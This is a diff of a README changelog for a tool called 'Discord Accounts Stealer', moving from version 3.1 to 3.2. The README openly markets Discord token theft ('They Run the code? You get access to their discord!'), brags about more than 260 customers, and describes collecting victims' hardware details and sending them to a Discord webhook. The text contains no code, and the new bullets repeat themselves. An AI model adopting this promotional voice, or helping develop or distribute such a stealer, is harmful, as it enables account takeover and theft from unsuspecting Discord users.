@@ -1,4 +1,4 @@
-## 🔑 Discord Accounts Stealer 3.1 - ISSUE TRACKER UPDATE (BETA)
+## 🔑 Discord Accounts Stealer 3.2 - ISSUE TRACKER UPDATE (BETA)
 > **If not the best and easiest discord token stealing software script! :tada:**
 
 > **🤖 They Run the code? You get access to their discord! - It's that easy!**
@@ -32,35 +32,16 @@
 > **Last versions we gained more than 260 Customers, when all of the accounts were deleted due this update, Think we can gain even more?**
 
 ## 📝 What's New?
-- **Variable colors - Added back from versions 1.0**
+* Introduced a system which will be able to tell if all values are defined.
+> a case where they are not defined is going to make the discord message _Unsendable_
 
-    Variables can be found from lines 5 - 9
-
-
-- **New GPU, PROCESSOR System**
-
-    Attempts to fix a bug which other people may not get the hardware message in a success / error cases).
-
-    _GPU and PROCESSOR variable would include some weird characters_
-
-- **Removed a useless piece of code which were used to be implanted at 3.0**
-
-    the piece of code was a command which were responsible to download a file which its size is about 60 KB which was not used at all in the script
-
-    it was added from the first place because the original plan was to involve [Advanced Embeds Project](https://github.com/agamsol/Batch-Projects/tree/main/Advanced%20Embeds) in order to send the accounts to your discord accounts, in the middle of coding I notice it is very buggy and unstable and I decided that I will not use it and make the discord request on my own.
-
-    _Those 60 KB were not calculated in the project's README file and they were inaccurate._
-
-    _as of this update they are acurate.
-    the size of the whole project is now about 29 KB_
+* Fixed Mmajor bug in the command prompt commands
 
 #### 🗳️ ISSUE TRACKER SYSTEM (MAJOR) - READ PLEASE
-> Due to a bug where not all messages are being sent, I had to think of a way to know what makes them invalid, this had me thinking of 2 methods to check if the messages were correctly sent
+* Introduced a system which will be able to tell if all values are defined.
+> a case where they are not defined is going to make the discord message _unsendable_
 
-- Checking the syntax of the json file (which is being sent to you)
-- Check if it has more than 1 line
-
-_Those 2 options are very helpful for me to track the issue and solve it for everyone_
+* Fixed Mmajor bug in the command prompt commands
 
 > **File size history:**
 >
@@ -70,7 +51,7 @@ _Those 2 options are very helpful for me to track the issue and solve it for eve
 >
 > **3.0:** About 90 KB
 >
-> **3.1** _(this)_**:** About 29 KB
+> **3.1 - 3.2** _(this)_**:** About 29 KB
 
 ## 💡 Plans for the feature
 * **Get rid of `src/NonAscii.exe`**
